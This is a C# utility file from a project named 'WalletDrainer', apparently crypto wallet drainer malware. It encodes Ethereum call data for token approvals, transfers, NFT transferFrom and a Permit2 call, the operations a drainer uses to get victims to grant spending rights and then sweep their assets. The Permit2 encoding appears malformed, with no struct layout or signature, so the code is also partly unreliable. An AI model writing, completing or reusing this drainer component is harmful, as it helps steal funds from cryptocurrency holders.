using System.Numerics;

namespace WalletDrainer.Utils;

public static class AbiEncoder
{
    private const string ApproveSelector = "095ea7b3";
    private const string TransferSelector = "a9059cbb";
    private const string TransferFromSelector = "23b872dd";
    private const string Permit2Selector = "2b67b570";

    public static string EncodeApprove(string spender, decimal amount)
    {
        string paddedSpender = PadAddress(spender);
        string paddedAmount = PadUint256(amount);
        return $"0x{ApproveSelector}{paddedSpender}{paddedAmount}";
    }

    public static string EncodeTransfer(string to, decimal amount)
    {
        string paddedTo = PadAddress(to);
        string paddedAmount = PadUint256(amount);
        return $"0x{TransferSelector}{paddedTo}{paddedAmount}";
    }

    public static string EncodeTransferFrom(string from, string to, long tokenId)
    {
        string paddedFrom = PadAddress(from);
        string paddedTo = PadAddress(to);
        string paddedTokenId = PadUint256(tokenId);
        return $"0x{TransferFromSelector}{paddedFrom}{paddedTo}{paddedTokenId}";
    }

    public static string EncodePermit2(string token, string spender, decimal amount, long deadline)
    {
        string paddedToken = PadAddress(token);
        string paddedSpender = PadAddress(spender);
        string paddedAmount = PadUint256(amount);
        string paddedDeadline = PadUint256(deadline);
        return $"0x{Permit2Selector}{paddedToken}{paddedSpender}{paddedAmount}{paddedDeadline}";
    }

    private static string PadAddress(string address)
    {
        string clean = address.StartsWith("0x") ? address[2..] : address;
        return clean.PadLeft(64, '0');
    }

    private static string PadUint256(decimal value)
    {
        var bigInt = new BigInteger(value);
        string hex = bigInt.ToString("x");
        return hex.PadLeft(64, '0');
    }

    private static string PadUint256(long value)
    {
        string hex = value.ToString("x");
        return hex.PadLeft(64, '0');
    }
}
